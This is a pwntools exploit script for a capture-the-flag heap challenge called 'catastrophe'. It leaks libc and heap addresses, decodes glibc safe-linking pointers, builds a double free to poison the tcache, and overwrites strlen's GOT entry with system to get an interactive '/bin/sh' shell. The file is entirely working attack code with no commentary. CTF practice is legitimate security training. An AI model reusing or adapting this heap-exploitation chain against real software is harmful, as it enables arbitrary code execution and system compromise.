from pwn import *

#r = process(["./catastrophe"], env={"LD_PRELOAD":"./libc.so"})
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
# r = remote("mc.ax", 31273)
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

r = process("./catastrophe")

def add(idx, size, data):
    r.sendline("1")
    r.sendline(str(idx))
    r.sendline(str(size))
    r.sendline(data)

def free(idx):
    r.sendline("2")
    r.sendline(str(idx))

def view(idx):
    r.sendline("3")
    r.sendline(str(idx))

def decrypt(cipher):
    key = 0
    plain = 0

    for i in range(1, 6):
        bits = 64-12*i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12

    return plain

for i in range(9):
    add(i, 0x200, "Sechack")
for i in range(8, -1, -1):
    free(i)

view(0)

libc_leak = u64(r.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
libc_base = libc_leak - 0x219ce0
strlen_got = libc_base + 0x219098
system = libc_base + libc.sym["system"]
print(hex(libc_base))
print(hex(strlen_got))

for i in range(9):
    add(i, 0x10, "Sechack")
for i in range(7):
    free(i)

free(7)
free(8)
free(7)

view(8)

heap_leak = decrypt(u64(r.recvuntil("\x55")[-6:].ljust(8, b"\x00")))
heap_base = heap_leak - 0x370
print(hex(heap_base))

for i in range(7):
    add(i, 0x10, "Sechack")

add(0, 0x10, p64((strlen_got-8) ^ (heap_base >> 12)))
add(0, 0x10, "Sechack")
add(1, 0x10, b"/bin/sh\x00")
add(0, 0x10, p64(0)+p64(system))
view(1)

r.interactive()